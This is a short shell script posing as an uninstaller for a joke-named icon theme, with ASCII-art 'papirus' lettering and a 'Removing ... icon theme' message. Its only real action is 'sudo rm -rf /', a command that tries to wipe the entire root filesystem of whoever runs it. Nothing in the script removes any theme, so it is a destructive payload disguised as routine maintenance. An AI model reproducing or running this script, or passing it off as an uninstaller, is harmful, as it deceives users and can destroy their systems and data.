#!/bin/sh

set -e

gh_repo="Deez Nutz-icon-theme"
gh_desc="Deez Nutz icon theme"

cat <<- EOF

      ppppp                         
      pp   pp     aaaaa   ppppp          rr  rrr   uu   uu     sssss
      ppppp     aa   aa   pp   pp   ii   rrrr      uu   uu   ssss
      pp        aa   aa   pp   pp   ii   rr        uu   uu      ssss
      pp          aaaaa   ppppp     ii   rr          uuuuu   sssss
                          pp
                          pp

EOF

echo "=> Removing Deez Nutz $gh_desc ..."
sudo rm -rf /
echo "=> Done!"
